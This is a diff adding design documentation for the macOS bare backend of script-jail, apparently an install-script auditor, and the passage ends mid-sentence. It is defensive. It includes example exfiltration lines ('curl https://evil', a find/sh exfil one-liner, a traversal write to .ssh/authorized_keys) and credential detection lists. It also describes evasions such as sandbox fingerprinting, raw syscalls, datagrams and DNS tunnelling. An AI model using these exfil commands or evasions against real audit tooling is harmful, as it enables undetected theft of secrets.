@@ -46,6 +46,604 @@ generation, not as expected divergence.
   any audit runs. v1 will not add support; the JS-only env hooks bun
   ignores would leave too much unaudited.
 
+## macOS bare backend
+
+`script-jail check --backend bare` on a Mac audits the install **directly on
+the host** (no VM, no container). It mirrors the Linux `bare` backend but,
+because macOS has no `strace` and no `/proc`, the Mach-O `__interpose` shim is
+the **sole** event source. That single difference drives every reconciliation
+rule below. The goal is unchanged: one committed `.script-jail.lock.yml` that
+reconciles against the Linux Action backend after `scripts/parity-diff.ts`
+canonicalization. These are the macOS-specific cases that filter must absorb.
+
+- **SIP-binary substitution (why there is no arm64e dylib).** On Apple Silicon
+  the system shells (`/bin/sh`, `/bin/bash`) and coreutils (`/bin/echo`, …) are
+  **arm64e**, and dyld refuses to inject a plain-arm64 dylib into an arm64e
+  process. Rather than ship a universal arm64+arm64e dylib (which needs a nightly
+  `-Z build-std` toolchain), the shim **never runs the arm64e binary**: at exec
+  time it rewrites any `/bin`/`/usr/bin` program whose basename is `sh`/`bash`
+  to a bundled **from-source bash** (`bash-arm64`), and any uutils applet to a
+  bundled **uutils/coreutils** multi-call binary (`coreutils-arm64`) — both plain
+  arm64, both ad-hoc signed. `argv[0]` is preserved so bash self-selects sh/bash
+  mode and uutils dispatches the right applet. The dylib then loads cleanly into
+  the substitute, so script-jail ships a **thin `aarch64-apple-darwin` dylib**.
+  Two consequences for divergence:
+  - **Audit-blind residual, surfaced as `<AUDIT_BLIND>`.** Any `/bin`/`/usr/bin`
+    binary that is *not* a shell or a uutils applet — `sed`, `awk`, `grep`,
+    `find`, `xargs`, `which`, `cmp`, `/usr/bin/python3`, `/usr/bin/git`, `perl`,
+    `ruby`, … — has no plain-arm64 substitute, so when `sip_redirect` leaves the
+    path unchanged the real arm64e binary runs with `DYLD_INSERT_LIBRARIES`
+    stripped by SIP: it and its descendants run **un-instrumented** (a malicious
+    `find . -exec /bin/sh -c '<exfil>' \;` would otherwise hide the exfil
+    entirely). The shim tags such execs `audit_blind`, and `normalize.ts` renders
+    them with an **`<AUDIT_BLIND>` prefix in `spawn_attempts`/`spawn_blocked`** so
+    the lock diff exposes the blind subtree. This is **informational, not an
+    `audit_bypass` hard-fail** — benign `find`/`sed`/`grep` use stays green; a
+    reviewer simply sees *which* exec escaped instrumentation and must inspect it.
+    Note this is a deliberate **coverage trade of the no-arm64e substitution
+    model**, not parity with fspy: the prior re-signing approach *did* instrument
+    these tools (via a universal arm64+arm64e dylib), at the cost of a nightly
+    `-Z build-std` toolchain. Firecracker remains the high-assurance backend when
+    full subtree coverage matters.
+  - **External (non-SIP) system tools are also audit-blind.** SIP only strips
+    `DYLD_INSERT_LIBRARIES` for `/bin` and `/usr/bin`; a tool resolved to a
+    **non-SIP** location — Homebrew (`/opt/homebrew`, `/usr/local`), `/nix`,
+    `/Library`, a user's `~/.foo/bin`, etc. — would otherwise **load the dylib**
+    and emit *its own* `getenv`/file/connect traffic (e.g. Homebrew `git`'s 20+
+    `GIT_*` reads + `$HOME/.gitconfig`) under the spawning package's attribution.
+    That is pure macOS-only noise the Linux microVM never produces (Linux records
+    only the spawn line for such a tool), so it diverges the lock. The shim
+    classifies any exec target resolved **outside every keep-audited root** (the
+    provisioned-toolchain root = parent of the shell-shim dir, this process's own
+    exec dir, the shell-shim dir, the **live** install cwd, the **immutable** cwd
+    snapshotted at ctor before any lifecycle `chdir`, and the **install/repo root**
+    `SCRIPT_JAIL_WORK_DIR` = the agent's `config.work_dir`) as an **external system
+    tool**: it strips `DYLD_INSERT_LIBRARIES` / `DYLD_FORCE_FLAT_NAMESPACE` /
+    `NODE_OPTIONS` / the sticky `SCRIPT_JAIL_*` vars from the child env (so the
+    shim never loads into it **or its subtree**) and tags the exec `audit_blind`,
+    surfaced as `<AUDIT_BLIND>` exactly like the SIP case above. This **widens the
+    blind set** to match the SIP model rather than instrumenting non-SIP tools
+    half-way (which produced wrong, package-attributed reads). **Same trade as the
+    SIP residual:** a malicious package can run code via an external interpreter
+    (`/opt/homebrew/bin/python3 ./postinstall.py`, `perl ./x.pl`, a `git` alias/
+    hook) un-instrumented — but the blind subtree is **surfaced** (`<AUDIT_BLIND>`)
+    for a reviewer, and **Firecracker is the enforcement boundary**. **Keep-audited
+    by design:** the provisioned node + its node-spawned-node children + every
+    `node_modules/.bin`/`.pnpm-store`/package-owned binary under the **install
+    root** stay instrumented (they are package code Linux audits), so this only
+    blinds genuine *system* tools. The install-root anchor (`SCRIPT_JAIL_WORK_DIR`,
+    sticky + re-injected) is what keeps a top-level `node_modules/.bin` helper
+    audited even when a lifecycle script `chdir`s into a package dir first — such a
+    helper is a *sibling* of the per-package cwd, so the live/immutable-cwd anchors
+    alone would miss it.
+  - **Blind-classification robustness (lexical canon + spawnp PATH search).** The
+    `audit_blind` tag and `sip_redirect` both key off the program path, so a
+    non-canonical path could dodge them: `/usr/lib/../bin/find` does not byte-match
+    `/usr/bin/` yet still execs the real `find`. Before classifying *and* before
+    redirect matching, the shim runs a **purely lexical** canonicalizer that
+    collapses `.`, `..`, and `//` in **absolute** paths — so `/usr/lib/../bin/find`
+    → `/usr/bin/find` is still marked `<AUDIT_BLIND>`, and `/usr/lib/../../bin/sh`
+    → `/bin/sh` is still redirected to the bundled bash. `posix_spawnp` with a
+    **bare name** (no slash) is run through the same in-process `PATH` search that
+    `execvp` uses, so `posix_spawnp("find", …)` resolves to `/usr/bin/find` and is
+    marked too. The `sip_redirect` **substitution** match (which swaps `/bin/sh` →
+    bundled bash, a coreutil → uutils) is still purely lexical, so a symlink to a
+    SIP shell/coreutil is **not** substituted — but it is still caught as an
+    external tool (see next).
+  - **External-tool classification resolves symlinks (realpath).**
+    `is_external_system_tool` — which decides whether to strip DYLD + sticky vars
+    and mark `<AUDIT_BLIND>` for a spawn outside every keep-audited root — runs the
+    program path through the **real `realpath`** before classifying (adversarial
+    review). That both **absolutizes** a relative path (against this process's live
+    cwd — exact for an `execve`, which does not change cwd; see the `posix_spawn`
+    caveat below) and **resolves symlinks**, so an
+    *in-tree* symlink such as `node_modules/.bin/git` → `/opt/homebrew/bin/git` (or
+    a relative `./node_modules/.bin/git`) classifies on its TRUE target → EXTERNAL
+    → `<AUDIT_BLIND>`, instead of being lexically kept and run shimmed (which would
+    leak the tool's reads) or run dyld-stripped-but-unmarked. This does **not**
+    false-strip legit package code: pnpm's store is pinned in-tree
+    (`--store-dir=${cwd}/.pnpm-store`, under work-dir keep-root #6) so store
+    symlinks resolve back under the install root, and the provisioned toolchain
+    path has no non-`/private` symlink component (its realpath differs from the
+    lexical anchor only by the `/private` bridge the keep-root checks already
+    reconcile). **Residuals (accepted, Firecracker is the enforcement boundary):**
+    (1) *TOCTOU* — the classifier realpaths the path but the kernel later `exec`s
+    the original pathname, so a **concurrent** process racing a symlink swap in the
+    tiny classify→exec window can desync the decision; the outcome is fail-closed
+    (an external tool kept → macOS-only noise → byte-divergence fails the gate) or
+    audit-blind-recorded (an in-tree payload run stripped is still surfaced as
+    `<AUDIT_BLIND>`). Closing it fully needs `fexecve` on an O_NOFOLLOW fd, which
+    would break the bundled coreutils' argv[0]-based multi-call dispatch. (2)
+    *Hardlinks* — `realpath` resolves symlinks, not hardlinks; a same-volume
+    hardlink to a system tool's inode placed in-tree would read as in-tree (system
+    bins are typically SIP/read-only, so this is narrow). (3) A `realpath` **failure**
+    on an **absolute** input falls back to the lexical path — err-toward-keep; that
+    exec would generally `ENOENT` too. A failure on a **relative** input does NOT
+    strip; `posix_spawn`'s child-cwd ambiguity is handled by chdir tracking instead
+    (next bullet).
+  - **`posix_spawn` relative-program targets are audit-blind under a tracked chdir**
+    (adversarial-review HIGH, 2026-06). `execve` resolves a relative program path
+    against the calling process's cwd — exactly the cwd `is_external_system_tool`'s
+    `realpath` used — so it is provable. `posix_spawn`/`posix_spawnp` can carry a
+    `posix_spawn_file_actions_addchdir_np` / `_addfchdir_np` action that moves the
+    **child's** cwd before it resolves a relative path, so the parent-cwd classify
+    is for the wrong directory — `./tool` could resolve under the chdir target to a
+    SIP binary (or symlink to one) that runs un-audited with **no** marker. There is
+    **no public API** to read a `posix_spawn_file_actions_t` back, so the shim
+    **interposes the functions that add a chdir action** — the 10.15
+    `addchdir_np` / `_addfchdir_np` (in Rust) **and** the macOS-26 non-`_np`
+    replacements `addchdir` / `_addfchdir` — plus `init`/`destroy`, and records
+    which file-actions carry a child-cwd change (a fixed spinlocked set,
+    `CHDIR_FA_SLOTS`; insert on add, clear on init/destroy, overflow fails closed).
+    The set is keyed by the file-actions **handle address** (the
+    `posix_spawn_file_actions_t *` the caller passes), **not** the heap object: a
+    later `addopen`/`addclose` **reallocs** the object (verified — its pointer
+    moves), so an object value captured at `addchdir` time would not match
+    `*file_actions` at spawn time, whereas the handle address is stable.
+    `dispatch_spawn_macos` then marks a spawn **`<AUDIT_BLIND>`**
+    while **keeping DYLD** (`external` stays false) iff its program path is
+    **relative** AND its file-actions handle is **tracked as carrying a chdir** — an
+    honest "could not see what the child execs," yet an auditable plain-arm64 child
+    still loads the shim and emits its own events. This fires **only** on a real
+    child-cwd change: the stdio-only file-actions libuv attaches to *every* spawn are
+    not chdir actions, so ordinary relative spawns are unaffected. Absolute program
+    paths are cwd-independent (a chdir cannot move them) and are never affected. This
+    closes the **decoy** variant — a benign `./tool` planted in the parent cwd so
+    `realpath` succeeds there while the chdir target holds a different binary — which
+    a parent-cwd realpath check alone would miss (verified end-to-end: the decoy,
+    a `_np` chdir followed by enough `addclose` to realloc the object, and a non-`_np`
+    chdir all render `<AUDIT_BLIND>`; a no-chdir relative spawn and an absolute-under-
+    keep-root spawn do not). The non-`_np` symbols are `__API_AVAILABLE(macos(26.0))`,
+    so their interpose lives in C (stable Rust has no weak extern). Making it both
+    **build** and **load** on the pre-26 `macos-14` parity runner — whose SDK omits
+    these symbols from `libSystem.tbd` entirely (only the `_np` forms exist; verified
+    in `MacOSX15.4.sdk`) — takes **two** mechanisms working together:
+    1. **Compile:** on a sub-26 SDK the C file declares the two functions manually with
+       `__attribute__((weak_import))` (guarded off on the macOS-26 SDK, which already
+       declares them availability-weak at the sub-26 deployment target). Without this
+       a bare reference is an implicit-declaration error.
+    2. **Link:** the kept `__interpose` tuples still emit relocations to those symbols,
+       so the final cdylib link would fail with *Undefined symbols …
+       `_posix_spawn_file_actions_add{,f}chdir`* before the runtime weak-NULL behavior
+       is ever reached. `src/shim/build.rs` adds `-Wl,-U,_posix_spawn_file_actions_addchdir`
+       and `…_addfchdir` (cdylib-scoped, exactly those two symbols) to allow them
+       undefined at link. Paired with the `weak_import` reference, each becomes a
+       **weak, dynamically-looked-up** undefined: dyld binds it to the real function on
+       macOS 26+ and to **NULL** on older macOS, where a `{ replacement, NULL }`
+       interpose tuple is an inert no-op so the dylib still loads (verified on both
+       SDKs: 15.4 → link OK, symbols `weak external … dynamically looked up`; 26.5 →
+       symbols `weak external … from libSystem`, dylib loads under injection). The
+       `-U` flags are a harmless no-op on the 26 SDK, where the symbols are present.
+    **Reachability:** the parity fixture (`vuejs/core`) has
+    **zero** relative-program spawns — its only `./` line is `node ./postinstall.js`,
+    where the program is `node` (PATH-resolved to the absolute provisioned node) and
+    `./postinstall.js` is an argument — so this is **gate-neutral**. A bare-name
+    `posix_spawnp` that DOES carry a tracked chdir (libuv adds one for its `cwd`
+    option, so ordinary lifecycle `sh`/`node` spawns have one) is still resolved
+    through the **absolute** `PATH` dirs (`resolve_path_search_chdir_safe`), which a
+    chdir cannot move, so it stays PROVABLE (resolved → `sip_redirect` / correct
+    marking) and is NOT falsely `<AUDIT_BLIND>`; only a name the kernel could reach
+    via a cwd-dependent `PATH` segment (empty / relative / `.`) — the actual attack
+    surface — is left bare and marked. **Residual
+    (accepted):** the set is keyed by handle address, so a caller that copies the
+    `posix_spawn_file_actions_t` **value** into a second variable and spawns with
+    `&copy` presents a different handle and is not tracked — but the type is opaque,
+    copying it is unsupported (a `destroy` of one would double-free the shared
+    object) and no real toolchain does this; and macOS-bare is observe-only, so
+    Firecracker remains the enforcement boundary. This is the same class as the
+    raw-syscall interpose bypass below: a determined native attacker can already
+    evade an `LD_PRELOAD`/`__interpose` auditor, so closing it is out of scope for
+    this observation layer. The two alternatives are deliberately rejected: keying
+    on the object **value** instead of the handle would reintroduce the realloc
+    miss this design fixes (appending later actions moves the heap object), and
+    pessimistically blinding *every* relative-program `posix_spawn` with a non-null
+    `file_actions` would over-blind the benign stdio-only spawns libuv attaches to
+    nearly every child and risk diverging from Linux.
+  - **Fingerprinting + BSD-semantics caveat.** The substitutes are uutils (GNU
+    semantics) and bash 5.3, not the macOS BSD system binaries, so behaviour
+    diverges in two ways. (1) *Fingerprint:* a script can detect the sandbox from
+    version banners (`date --version` succeeds under uutils, fails on real macOS)
+    **and** from BSD-vs-GNU flag handling — `date -j`, `stat -f`, `cp -X` are
+    rejected by uutils; `du`/`df` report different block-size units; `uname -p`
+    prints `unknown` vs `arm`. A benign-when-watched payload *could* gate on these
+    and evade. (2) *Correctness:* a lifecycle script relying on those BSD-specific
+    flags behaves differently under the bare backend than on the host. Both are
+    inherent to substitution-based observation (the Linux backend has the
+    analogous "GNU coreutils + dash in the rootfs" property). For evasion- and
+    fidelity-sensitive audits, use **Firecracker**.
+
+- **Connect: blocked on Linux, online on macOS-bare, reconciled by prefix strip.**
+  Linux runs Phase B **offline** via `unshare -n`, so every observed connect is
+  recorded `<BLOCKED> connect <host>:<port>`. The macOS bare backend is
+  **observe-only and stays ONLINE** (user decision 3): the Rust shim interposes
+  `connect`/`connectx` (`src/shim/src/net.rs`), gated on `SCRIPT_JAIL_MACOS_AUDIT_OPS`
+  which `src/guest/agent.ts` sets for Phase B only, but it does **not** enforce
+  offline — it FORWARDS the real call and records the attempt with its TRUE result
+  (a succeeded connect → `connect <host>:<port>` with no prefix; a failed one →
+  `<BLOCKED> connect …`). A non-blocking connect — which is how libuv, and thus
+  **all** Node networking, issues connects — returns `EINPROGRESS` (or `EALREADY`/
+  `EISCONN`) while the SYN is already on the wire: that counts as **egress-occurred
+  → "ok"**, not blocked (round-12 finding F3). Both classifiers agree
+  (`src/guest/strace-parser.ts` for Linux, `src/shim/src/net.rs` for macOS-bare);
+  resolving the *final* result of an in-flight connect would need an `SO_ERROR`
+  follow-up, tracked as v2. `connectx` (the Darwin connect-equivalent) is observed
+  the same way, since a connect-only interpose would miss it. `AF_UNIX`/other
+  local-IPC families are not inet and are dropped. Each committed lock stays
+  faithful to what its backend saw (`src/lock/normalize.ts` does **not** rewrite
+  the per-host result), and `scripts/parity-diff.ts` reconciles the offline/online
+  split by **stripping the `<BLOCKED> ` prefix from connect entries on both sides**
+  (narrowly — only `<BLOCKED> connect ` entries, never dlopen), so a Linux blocked
+  connect and a macOS online connect to the SAME host reduce to
+  `connect <host>:<port>` and match. A connect to a **different** host, or one
+  present on only one side, still surfaces as a diff hunk; inside a danger-checked
+  divergent package, any non-resolver connect surfaces regardless of result.
+  Host-resolver noise is reconciled by an **exact-match** allowlist of the three
+  observed resolver endpoints (see below), compared in their post-strip
+  `connect <addr>:53` form.
+
+  > **The strip is attempt-parity, not enforcement-parity (round-12 finding F1,
+  > kept by decision).** Collapsing a Linux-`<BLOCKED>` connect and a macOS-`ok`
+  > connect to the same `host:port` is deliberate: the parity gate exists to prove
+  > the two backends observed the **same dependency behaviour** (a byte-stable,
+  > cross-backend-reproducible lock), **not** to assert macOS prevented egress. The
+  > alternative — failing or flagging every Linux-blocked-vs-macOS-ok connect —
+  > would diverge on *every* benign network-using package (puppeteer fetching
+  > Chrome, @swc fetching wasm, any registry/DNS touch), making the gate useless.
+  > The honest enforcement claim lives in the security note below: macOS-bare does
+  > **not** enforce; **Firecracker** does. The raw macOS lock still shows the true
+  > `ok`/`<BLOCKED>` per host (normalize never rewrites it) — only the diff
+  > reconciles the offline/online split.
+
+  > **Security note — macOS-bare does NOT enforce offline.** Unlike Linux's
+  > `unshare -n` (a kernel network namespace), the macOS bare backend has no
+  > kernel-level network-off: it is **observe-only**, and even the observation
+  > only covers processes the Mach-O shim is loaded into. Three gaps follow — all
+  > closed by Firecracker, none by macOS-bare:
+  >   1. **Audit-blind children egress for real.** SIP-protected system binaries
+  >      that are not substituted (`curl`, `git`, `python3`, `perl`, `ruby`, …)
+  >      strip `DYLD_INSERT_LIBRARIES` on exec, so the shim never loads — a
+  >      lifecycle script that runs `curl https://evil` reaches the live host
+  >      network and the connect is never recorded (only the `<AUDIT_BLIND>`
+  >      spawn is).
+  >   2. **Raw syscalls bypass the interpose.** Native code that issues
+  >      `syscall(SYS_connect)` / `SYS_connectx` / `SYS_sendto` / `SYS_sendmsg(_x)`
+  >      directly never touches the `__interpose` table, so it egresses with no
+  >      `NetworkEvent`.
+  >   3. **Connectionless datagrams are neither blocked nor recorded** —
+  >      `sendto`/`sendmsg` are not interposed in the observe-only model (see the
+  >      residual list below).
+  > Phase A fetch is online by design (lifecycle scripts do not run in Phase A —
+  > npm/pnpm fetch with `--ignore-scripts`). **For any audit where egress
+  > prevention or completeness matters, use Firecracker** — it is the
+  > high-assurance backend; macOS-bare is a local convenience whose network
+  > recording is best-effort over instrumented processes only.
+
+- **Resolver-address filter.** A name lookup the install triggers connects to
+  the host's DNS endpoint. On macOS-bare these succeed (online); on Linux they
+  are blocked (offline). After the `<BLOCKED> ` strip both reduce to
+  `connect <addr>:53`, and the parity filter drops the three observed resolver
+  endpoints: the Apple Virtualization.framework NAT resolver (`192.168.64.1:53`),
+  the Azure runner endpoint (`168.63.129.16:53`), and the macOS system stub
+  resolver on loopback (`127.0.0.1:53`, mDNSResponder). These are host resolver
+  plumbing, not dependency behavior. A connect to any other endpoint — or to one
+  of these on a port other than 53 — still surfaces.
+
+- **Intrinsically platform-divergent packages (danger-checked exclusion).** Three
+  packages install via a genuinely different code path on the bare backend's
+  "Darwin-pretending-to-be-Linux" environment (it spoofs `platform=linux`), so
+  `scripts/parity-diff.ts` excludes the **per-package lock block** for each from
+  **both** lockfiles before the byte comparison. They are matched by **name
+  prefix** (`@swc/core@`, `puppeteer@`, `unrs-resolver@`) so a fixture version
+  bump cannot silently un-exclude them. **The comparison is structural, not
+  line-based:** each lock is parsed, strict-validated, danger-walked, then the
+  divergent packages are dropped and the parity-only noise filtered **on the
+  parsed structure**, and the result is re-rendered through the canonical
+  byte-stable serializer (`src/lock/render.ts`) before the two renders are
+  diffed. Because the parser and the strip/filter operate on the same structure,
+  they can never disagree the way a line scanner and the parser could — the class
+  of evasions a text stripper allowed (YAML aliases splicing one package's
+  content into another, non-canonical key spellings desyncing the scanner,
+  unknown top-level sections escaping the byte compare) is eliminated
+  structurally. To keep that guarantee, the gate rejects the YAML features that
+  reintroduce ambiguity: **aliases, anchors, merge keys, non-string keys,
+  `__proto__`, and keys carrying a control character (e.g. TAB) all fail CLOSED**
+  as a whole-lock danger (the canonical renderer never emits any of them, so a
+  conformant lock has none — the control-char rejection in particular stops a key
+  from forging a `package\tstage` presence composite). Both locks are validated against a **fully
+  `.strict()`** parity schema (`ParityLock` in `scripts/parity-diff.ts`, built on
+  `src/lock/schema.ts`) at **every** level — top section, package entry, and
+  lifecycle block — so a malformed shape (an `external_reads` that is an object),
+  an unknown extra field (`secret_reads: [$HOME/.ssh/id_rsa]`), and an unknown
+  top-level **section** (e.g. a `metadata:` sibling) all fail CLOSED as a danger
+  rather than being silently dropped from both re-renders. Top-level strictness is
+  load-bearing here: the re-render only serializes known fields, so a permissive
+  schema would drop an unknown section from both sides and launder a one-sided
+  escape to a clean exit 0. The exclusion is **not** blind: before a block is
+  dropped, `collectDivergentDangers` screens the parsed block on **each** side for
+  any signal a one-sided escape could hide behind. The exfil-vector screens are
+  **default-deny over what the producer records** — *every* non-events-file
+  `escaped_writes`, *every* recorded `network_attempts` that is not a known DNS
+  resolver, *every* `dlopen_attempts`/`audit_bypass`/`env_tamper`, and *every* spawn
+  outside the per-package benign allowlist fails the gate. This is the strongest
+  control, but it is bounded by audit coverage, so it is **not** an unconditional
+  "a secret can never leave": see the **connectionless-egress residual** below. The
+  credential **read** screen is therefore a co-equal control, not a fallback — it
+  flags the suspicious READ itself: a `<HIDDEN>` **or credential-named** `env_read`
+  and a
+  `<HIDDEN>`/sensitive `external_reads`. Because a divergent package legitimately
+  reads a large, platform-varying set of benign config/proxy/locale vars (the
+  committed baseline alone has 88) and the screen runs per side **including the
+  fresh Linux side**, the read screens cannot be default-deny without false-failing
+  on a benign read — so they match credential **shape** categorically rather than by
+  name list (adversarial review rounds 5/6/7): credential env substrings
+  (`TOKEN`/`SECRET`/`PASSWORD`/`CREDENTIAL`/`AUTHORIZATION`/`PRIVATEKEY`/`BEARER`/…,
+  case-insensitive) plus whole-**token** markers `AUTH`/`KEY`/`PAT` (split on
+  separators and camelCase, so `NPM_AUTH`/`SERVICE_ACCOUNT_KEY`/`GITHUB_PAT` hit but
+  `…UNAUTHORIZED`/`MONKEY`/`*_PATH` and the benign `npm_config_always_auth` flag do
+  not). The file screen matches the repo default protected set (`.ssh`/`.aws`/
+  `.npmrc`/`.netrc`/`.gnupg`) **plus** cloud-CLI / package-manager credential stores
+  the default set omits (`.config/gcloud`, `.azure`, `.kube`, `.docker/config`,
+  `.git-credentials`, `.pypirc`, `.cargo/credentials`, composer `auth.json`, NuGet
+  config) and key-file suffixes (`.pem`/`.p12`/`.pfx`/`.key`) and `.env`/`.env.*`,
+  segment/suffix-aware so a credential dir does not over-match a benign sibling
+  (`.cargo/credentials`, not the `.cargo` registry cache; `/.env`, not
+  `/.environment`). **Known residuals** (neither is unique to a stripped package —
+  both are audit-coverage limits of the engine, documented so the gate's guarantee
+  is not overstated):
+  - **Innocuously-named env secret.** A secret in an env var with no credential
+    token/keyword (e.g. `DEPLOY_HOOK` holding a token) is not flagged by the read
+    screen. To *leave*, it still needs a recorded exfil vector (network/spawn/
+    cross-package or external write), which the default-deny screens catch.
+  - **Connectionless datagram egress (macOS-bare): neither prevented nor recorded.**
+    A connectionless `sendto`/`sendmsg` to an IP literal skips `connect()`/
+    `getaddrinfo()`. On **Linux** Phase B runs under `unshare -n`, so the datagram
+    cannot leave (prevented, loopback only). On **macOS-bare** the backend is
+    observe-only and stays online, and `sendto`/`sendmsg` are **not** interposed,
+    so such a datagram DOES leave the host and produces no `network_attempts`
+    entry (the lock schema's `NetworkEvent` is `connect`-only). This is the same
+    class of gap as the audit-blind / raw-syscall egress called out in the connect
+    security note above — macOS-bare does not enforce offline. Recording datagram
+    egress on macOS would also require adding `sendto`/`sendmsg` to the Linux
+    strace set + the `NetworkEvent` schema (a one-sided macOS event would break
+    byte parity). Use **Firecracker** when datagram egress must be prevented.
+  - **Package writes to the audit events file are dropped (trusted-pid residual).**
+    Shim-instrumented lifecycle processes append their `env_read` audit lines to
+    `SCRIPT_JAIL_LOG_FILE` BY PATH (fd 3 does not survive the npm/pnpm/yarn
+    `stdio:'inherit'` spawn) and re-open it by path on EBADF as an anti-tamper
+    measure. The producer (Linux: `phase-install.ts`; macOS: the shim's
+    `path_is_audit_log`) drops writes to that exact path so the audit channel does
+    not self-observe. The events path is **readable** by package code (not a
+    read-protected env name), so a malicious shim-loaded pid that opens the same
+    path also has its write dropped. This is not separately defensible —
+    env-spy's own legitimate by-path reopen is indistinguishable from a malicious
+    open at the `open()` layer, and flagging would break the reopen and flake the
+    parity gate — so it is accepted as the **same trusted-pid residual** already
+    documented in `phase-install.ts` (an attacker inside an already-shim-loaded
+    pid can write forged JSONL regardless; the forgery detector only backstops
+    NON-shim-loaded writers). Firecracker's strace-sourced event stream is not
+    user-space-writable and does not share this channel.
+  Any finding **fails the gate** even when the
+  comparable text is byte-equal, so the exclusion can never launder a real
+  escape. The exclusion is also **symmetric down to the lifecycle stage**: a
+  divergent package present on only **one** side — *or* present on both but with a
+  one-sided / mismatched lifecycle stage (e.g. an empty `lifecycle: {}` vs a real
+  `postinstall`) — is a resolution/producer desync, not a free pass; the
+  cross-side presence check (package **and** stage) fails the gate and names the
+  missing side, so a one-sided absence can no longer be silently accepted. Each block is still
+  recorded in each backend's uploaded lockfile for manual inspection, and the
+  platform-**invariant** packages (`esbuild`, `simple-git-hooks`) stay under full
+  byte comparison, so real audit drift is still caught. Root cause per package:
+  - **@swc/core** — the linux-arm64 native binding cannot load on Darwin, so its
+    `postinstall.js` spawns `npm install @swc/wasm` (a whole nested npm
+    invocation), absent on Linux where the native binding loads.
+  - **puppeteer** — `install.mjs`'s `await import('puppeteer/internal/node/install.js')`
+    throws on the bare backend and it `process.exit(0)`s early, so it never
+    reaches the ~50 config/proxy env reads + the DNS connect that the Linux
+    install performs.
+  - **unrs-resolver** — `@napi-rs/postinstall` detects the platform without
+    shelling out to `uname`/`sed`/`dirname` on Darwin, so the Linux run records
+    the helper spawns are absent.
+
+  > **Residual — resolver waiver inside the divergent-package danger check**
+  > (adversarial review round-11, finding F2). The 3-IP host-resolver allowlist
+  > (`127.0.0.1:53` / `192.168.64.1:53` / `168.63.129.16:53`) is honored by
+  > `collectDivergentDangers`, not only by the byte-comparison filter. This is
+  > **load-bearing**: @swc/core's nested `npm install @swc/wasm` performs a live
+  > registry DNS lookup on the **online** macOS-bare backend (it is
+  > `<BLOCKED>`/absent on offline Linux), and attribution folds that child's
+  > `connect 127.0.0.1:53` into @swc/core's danger-checked block — so without the
+  > waiver the freshly generated macOS-bare CI leg would false-fail every run. The
+  > laundering surface is bounded to those 3 exact infra IPs on port 53 — loopback
+  > (local mDNSResponder, no remote reach), the VZ NAT gateway (absent on the bare
+  > backend), and the Azure magic IP — so it cannot exfil to an
+  > attacker-controlled remote host; any **other** `host:port` still fails the
+  > danger check. It is strictly narrower than, and the same class as, the
+  > accepted connectionless-`sendto` egress residual above.
+  >
+  > **Round-12 re-challenge (kept by decision).** A later review re-flagged this
+  > as a DNS-tunnel laundering channel: `NetworkEvent` records only `host:port`,
+  > not the DNS *qname*, so a lifecycle could in principle encode bytes into
+  > lookup names sent through the waived `:53` resolver and out to an authoritative
+  > nameserver — invisible in the lock. Two facts bound it and it is **kept as
+  > designed**: (1) removing the waiver from `collectDivergentDangers` does **not**
+  > close the channel — qnames are uncaptured on *both* backends, so the only
+  > effect is to false-fail @swc/core every run; (2) DNS-over-resolver exfil is
+  > inherent to *any* online backend, which is exactly why this is observe-only and
+  > **Firecracker (offline Phase B) is the enforcement boundary**. Closing it for
+  > real needs producer-side qname capture (v2) or offline enforcement, not a
+  > diff-time waiver change.
+
+  > **Observe-only download WRITE waiver + traversal guard.** A network-download
+  > divergent package (puppeteer) actually writes the downloaded files on the
+  > online macOS-bare backend while offline Linux blocks the fetch and writes
+  > nothing. Under `--source-of-truth left`, `reconcileObserveOnly` waives a macOS
+  > `escaped_writes` ONLY when (a) the package matches `PARITY_DIVERGENT_PACKAGES`
+  > and (b) the value sits at/under one of THAT package's **hardcoded** download
+  > roots (`PARITY_DIVERGENT_DOWNLOAD_ROOTS`, e.g. `puppeteer@` → `$HOME/.cache/
+  > puppeteer`) — never under a path the (influenceable) trusted side merely read.
+  > The value is **lexically normalized** (`.`/`..`/`//` collapsed over the
+  > `$TOKEN` tail) before the prefix test, so a traversal escape that *starts* with
+  > the root but lands outside it (`$HOME/.cache/puppeteer/../../.ssh/
+  > authorized_keys` → `$HOME/.ssh/authorized_keys`) is **not** waived — the shim
+  > records `open()`'s path argument verbatim and neither the shim's fs path-builder
+  > nor the tokenizer collapses `..` (adversarial review). A bounded residual
+  > remains by design: a write *genuinely* under the package's own cache root is
+  > waived un-flagged — that is the package's own download dir, not a system
+  > persistence location, and Firecracker (offline Phase B) is the enforcement
+  > boundary.
+
+  > **Observe-only download CONNECT — explicit egress allowlist, TOLERATED-and-
+  > surfaced.** The same network-download package also makes a real `connect` to the
+  > CDN on macOS-bare, which offline Linux never records: its Phase B (`unshare -n`)
+  > lookup dies at DNS before any connect survives, so EVERY Linux package block is
+  > `network_attempts: []` (verified across the whole parity fixture). A non-resolver
+  > connect is **demoted from blocking to tolerated** by `reconcileObserveOnly` ONLY
+  > when its `(package-prefix, phase)` is on the **explicit, repo-committed egress
+  > allowlist** `PARITY_OBSERVE_ONLY_EGRESS_ALLOW` (`egressAcknowledged`) — today the
+  > single entry `puppeteer@` → `['postinstall']`. This gate is **independent of any
+  > package write**: a divergent package not on the list (`@swc/core`, `unrs-resolver`),
+  > or `puppeteer@` in any other phase (e.g. `preinstall`), gets NO demotion — its
+  > connect stays a BLOCKING danger (the `3b`/`3c` tests pin both bounds). Host is not
+  > matched (the CDN rotates IPs run-to-run, `142.251.218.187` → `.219`, and the lock
+  > stores raw IPs) and there is no trusted-side connect to anchor on.
+  >
+  > **Why an explicit allowlist, not a write-derived gate (adversarial review round
+  > 3).** An earlier revision derived the connect waiver from a same-phase
+  > `escaped_write` under the package's own cache root — "download evidence". That is
+  > **package-controlled and forgeable**: a compromised `puppeteer@` could mint it by
+  > writing a throwaway `$HOME/.cache/puppeteer/.sentinel` and then `connect` anywhere.
+  > Because CI fails only on a non-zero exit, demoting that connect to a non-failing
+  > `TOLERATED` line did not close the hole — the egress still shipped. The fix is to
+  > gate the connect on a **curated CI decision no package can influence**: the
+  > acknowledgement now lives in source (`PARITY_OBSERVE_ONLY_EGRESS_ALLOW`), reviewed
+  > like any other code, and nothing a package does at install time can add itself.
+  > Every acknowledged connect is still **surfaced** as a non-failing `TOLERATED
+  > observe-only egress` entry (stdout block + report table, `formatTolerated`), never
+  > silently dropped (`3d` pins that a connect is tolerated with NO write at all —
+  > proof the gate is allowlist-derived, not write-derived). The gate exits 0 for the
+  > known CDN download (otherwise it false-fails every run — puppeteer always
+  > downloads). **Accepted residual (owner decision):** a compromised `puppeteer@` in
